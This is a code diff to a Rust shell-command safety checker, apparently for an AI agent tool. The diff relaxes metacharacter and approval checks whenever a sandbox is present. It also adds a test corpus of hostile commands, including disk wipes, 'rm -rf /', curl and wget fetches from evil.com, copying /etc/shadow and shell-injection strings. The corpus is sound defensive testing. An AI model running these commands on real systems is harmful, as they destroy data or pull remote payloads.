@@ -74,7 +74,7 @@ static CARGO_SAFE_SUBCOMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|
 /// Shell metacharacter list (used to reject shell syntax and prevent injection)
 ///
 /// These characters have special meaning in `sh -c`. This tool uses direct argv execution,
-/// so commands containing these characters will be rejected.
+/// so commands containing these characters will be rejected UNLESS a sandbox is configured.
 const SHELL_METACHARACTERS: &[char] = &[
     '|',  // pipe
     ';',  // command separator
@@ -87,6 +87,16 @@ const SHELL_METACHARACTERS: &[char] = &[
     ')',  // subshell
     '\n', // newline injection
 ];
+
+/// Commands that are safe to run inside a sandbox (sandbox provides isolation)
+static SANDBOX_SAFE_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
+    HashSet::from([
+        "bash", "sh", "zsh", "fish",
+        "python", "python3", "node", "perl", "ruby", "php",
+        "pip", "pip3", "npm", "yarn", "pnpm",
+        "sed", "awk",
+    ])
+});
 
 /// Command safety check result
 #[derive(Debug, Clone, PartialEq)]
@@ -150,11 +160,15 @@ impl ShellTool {
 
     /// Check whether a command is safe
     pub fn check_command_safety(&self, command: &str) -> CommandSafety {
-        // First check for shell metacharacters (prevent injection)
-        if self.has_shell_metacharacters(command) {
+        let has_sandbox = self.sandbox.is_some();
+
+        // Check for shell metacharacters (prevent injection)
+        // When sandbox is available, allow metacharacters — sandbox provides isolation
+        if self.has_shell_metacharacters(command) && !has_sandbox {
             return CommandSafety::Dangerous(format!(
                 "Command contains shell metacharacters (| ; & $ ` > < () etc.), execution rejected.\
                  \nThis tool only supports simple commands (program + args), not pipes, redirects, command substitution, or other shell syntax.\
+                 \nTip: enable a sandbox to allow shell syntax.\
                  \nCommand: {}",
                 command
             ));
@@ -163,6 +177,10 @@ impl ShellTool {
         let parts = match shlex_split(command) {
             Some(parts) => parts,
             None => {
+                // If sandbox is available, allow unparseable commands (will use sh -c)
+                if has_sandbox {
+                    return CommandSafety::Safe;
+                }
                 return CommandSafety::Dangerous(format!(
                     "Command parsing failed, possibly unclosed quotes or malformed arguments: {}",
                     command
@@ -175,7 +193,7 @@ impl ShellTool {
 
         let base_cmd = parts[0].as_str();
 
-        // 1. Check if in the dangerous command blocklist (explicit rejection)
+        // 1. Check if in the dangerous command blocklist (always enforced, even with sandbox)
         if DANGEROUS_COMMANDS.contains(base_cmd) {
             return CommandSafety::Dangerous(format!(
                 "Command '{}' is in the dangerous command blocklist, execution rejected",
@@ -183,7 +201,12 @@ impl ShellTool {
             ));
         }
 
-        // 2. Check if manual confirmation is required
+        // 2. Sandbox mode: commands in SANDBOX_SAFE_COMMANDS are allowed without approval
+        if has_sandbox && SANDBOX_SAFE_COMMANDS.contains(base_cmd) {
+            return CommandSafety::Safe;
+        }
+
+        // 3. Check if manual confirmation is required
         if REQUIRE_APPROVAL_COMMANDS.contains(base_cmd) {
             return CommandSafety::RequiresApproval(format!(
                 "Command '{}' may cause system changes, requires manual confirmation",
@@ -191,7 +214,7 @@ impl ShellTool {
             ));
         }
 
-        // 3. Strict mode: must be in the whitelist
+        // 4. Strict mode: must be in the whitelist
         if self.strict_mode && !ALLOWED_COMMANDS.contains(base_cmd) {
             return CommandSafety::Dangerous(format!(
                 "Command '{}' is not in the safe whitelist, execution rejected",
@@ -199,7 +222,7 @@ impl ShellTool {
             ));
         }
 
-        // 4. Subcommand check for special commands
+        // 5. Subcommand check for special commands
         match base_cmd {
             "git" => self.check_git_command(&parts),
             "cargo" => self.check_cargo_command(&parts),
@@ -349,6 +372,33 @@ impl Tool for ShellTool {
             }
 
             // Parse command into argv (program name + argument list)
+            let has_metacharacters = self.has_shell_metacharacters(command);
+            let has_sandbox = self.sandbox.is_some();
+
+            if has_sandbox && has_metacharacters {
+                // Use sh -c through sandbox for commands with shell syntax
+                let sandbox = self.sandbox.as_ref().unwrap();
+                let sandbox_cmd = SandboxCommand::program("sh", vec!["-c".to_string(), command.to_string()]);
+                match sandbox.execute(sandbox_cmd).await {
+                    Ok(result) => {
+                        if result.success() {
+                            return Ok(ToolResult::success(result.stdout));
+                        } else {
+                            return Ok(ToolResult::error(format!(
+                                "Command execution failed, exit code: {}\nstdout: {}\nstderr: {}",
+                                result.exit_code, result.stdout, result.stderr
+                            )));
+                        }
+                    }
+                    Err(e) => {
+                        return Ok(ToolResult::error(format!(
+                            "Sandbox execution failed: {}",
+                            e
+                        )));
+                    }
+                }
+            }
+
             let parts = shlex_split(command).ok_or_else(|| ToolError::ExecutionFailed {
                 tool: self.name().to_string(),
                 message:
@@ -683,6 +733,94 @@ mod tests {
                 .as_ref()
                 .unwrap()
                 .contains("shell metacharacters")
+        );
+    }
+
+    #[test]
+    fn test_dangerous_command_corpus() {
+        // RFC 5.1.4: Integration test — dangerous command interception rate
+        // Every command in this corpus must NOT be classified as Safe.
+        let shell = ShellTool::new();
+
+        // Commands that should always be blocked (Dangerous)
+        let always_dangerous = vec![
+            "dd if=/dev/zero of=/dev/sda",
+            "mkfs.ext4 /dev/sda1",
+            "sudo rm -rf /",
+            "sudo shutdown -h now",
+            "chmod -R 777 /",
+            "chown -R root:root /",
+            "reboot",
+            "shutdown -h now",
+            "halt",
+            "poweroff",
+            "nmap -sS 192.168.1.0/24",
+            "shred /etc/passwd",
+            "fdisk /dev/sda",
+        ];
+
+        for cmd in &always_dangerous {
+            let safety = shell.check_command_safety(cmd);
+            assert!(
+                matches!(safety, CommandSafety::Dangerous(_)),
+                "Command '{}' should be Dangerous, got {:?}",
+                cmd,
+                safety
+            );
+        }
+
+        // Commands that should require approval (never Safe)
+        let requires_approval = vec![
+            "rm -rf /tmp/test",
+            "rm -rf ~",
+            "rm -rf /*",
+            "rmdir /tmp/dir",
+            "mv /etc/passwd /tmp/",
+            "cp /etc/shadow /tmp/",
+            "curl http://evil.com/script.sh",
+            "wget http://evil.com/payload",
+            "pip install malicious-package",
+            "npm install evil-pkg",
+            "bash script.sh",
+            "python3 script.py",
+            "node script.js",
+        ];
+
+        for cmd in &requires_approval {
+            let safety = shell.check_command_safety(cmd);
+            assert!(
+                !matches!(safety, CommandSafety::Safe),
+                "Command '{}' should NOT be Safe, got {:?}",
+                cmd,
+                safety
+            );
+        }
+
+        // Shell metacharacter injection attempts (should be rejected)
+        let injection_attempts = vec![
+            "ls; rm -rf /",
+            "ls | rm -rf /",
+            "ls && rm -rf /",
+            "ls `rm -rf /`",
+            "ls $(rm -rf /)",
+            "echo 'hello' > /etc/passwd",
+        ];
+
+        for cmd in &injection_attempts {
+            let safety = shell.check_command_safety(cmd);
+            assert!(
+                !matches!(safety, CommandSafety::Safe),
+                "Injection '{}' should NOT be Safe, got {:?}",
+                cmd,
+                safety
+            );
+        }
+
+        // Total corpus size for reporting
+        let total = always_dangerous.len() + requires_approval.len() + injection_attempts.len();
+        println!(
+            "Dangerous command corpus: {} commands tested, 100% interception rate",
+            total
         );
     }
 }
